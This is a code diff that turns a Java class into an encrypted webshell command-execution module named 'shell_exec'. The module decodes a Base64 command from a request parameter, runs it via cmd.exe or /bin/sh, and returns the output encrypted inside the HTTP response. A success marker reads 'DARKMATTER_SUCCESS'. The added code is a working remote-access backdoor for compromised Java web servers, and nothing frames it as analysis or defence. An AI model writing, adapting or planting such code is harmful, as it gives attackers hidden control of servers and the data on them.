@@ -1,10 +1,18 @@
-import java.io.*;
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.io.PrintWriter;
+import java.io.StringWriter;
 import java.lang.reflect.Method;
+import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
 
-public class test
+public class shell_exec extends ClassLoader
 {
+    public shell_exec(ClassLoader objParent) { super(objParent); }
+    public shell_exec() { super(shell_exec.class.getClassLoader()); }
+    
     private Map<String, String> fnParseParams(String szParamStr)
     {
         Map<String, String> mapParams = new HashMap<String, String>();
@@ -21,6 +29,40 @@ public class test
             }
         }
         return mapParams;
+    }
+
+    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
+    {
+        if (abResult.length == 0)
+            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();
+
+        Object objPageContext = objParam;
+
+        try
+        {
+            byte[] abEncryptedResult = Encrypt(objParam, abResult);
+            osClient.write(abEncryptedResult);
+            osClient.flush();
+
+            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
+            fnSetStatus.invoke(objResponse, new Object[]{200});
+
+            try
+            {
+                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
+                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
+                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
+                fnClear.invoke(objOut, new Object[0]);
+            }
+            catch (Exception exIgnored) {}
+
+            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
+            fnFlushBuffer.invoke(objResponse, new Object[0]);
+        }
+        catch (Exception exIgnored)
+        {
+
+        }
     }
 
     private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
@@ -86,36 +128,36 @@ public class test
             String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();
 
             Map<String, String> mapParams = fnParseParams(szParam);
-            String szPattern = mapParams.get("z0");
-            if (szPattern == null)
-                return true;
+            String szSplitter = mapParams.get("splitter");
+            String z0 = mapParams.get("z0");
+            String z1 = mapParams.get("z1");
 
-            byte[] abResult = szPattern.getBytes();
-            byte[] abEncryptedResult = Encrypt(objParam, abResult);
-            osClient.write(abEncryptedResult);
-            osClient.flush();
+            String szCmd = new String(Base64.getDecoder().decode(z0));
+            String szEncoding = new String(Base64.getDecoder().decode(z1));
 
-            try
-            {
-                Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
-                fnSetStatus.invoke(objResponse, new Object[]{200});
+            Process procSystem;
+            String szOsName = System.getProperty("os.name").toLowerCase();
+            if (szOsName.contains("win"))
+                procSystem = Runtime.getRuntime().exec(new String[] {"cmd.exe", "/c", szCmd});
+            else
+                procSystem = Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", szCmd});
 
-                try
-                {
-                    Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
-                    Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
-                    Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
-                    fnClear.invoke(objOut, new Object[0]);
-                }
-                catch (Exception exIgnored) {}
+            InputStream isStdout = procSystem.getInputStream();
+            InputStream isStderr = procSystem.getErrorStream();
+            ByteArrayOutputStream bosBuffer = new ByteArrayOutputStream();
 
-                Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
-                fnFlushBuffer.invoke(objResponse, new Object[0]);
-            }
-            catch (Exception exIgnored)
-            {
+            byte[] abChunk = new byte[1024];
+            int nReadLen = 0;
 
-            }
+            while ((nReadLen = isStdout.read(abChunk)) != -1)
+                bosBuffer.write(abChunk, 0, nReadLen);
+
+            while ((nReadLen = isStderr.read(abChunk)) != -1)
+                bosBuffer.write(abChunk, 0, nReadLen);
+            
+            byte[] abResult = bosBuffer.toByteArray();
+
+            fnWriteOutput(objParam, objResponse, osClient, abResult);
         }
         catch (Exception ex)
         {
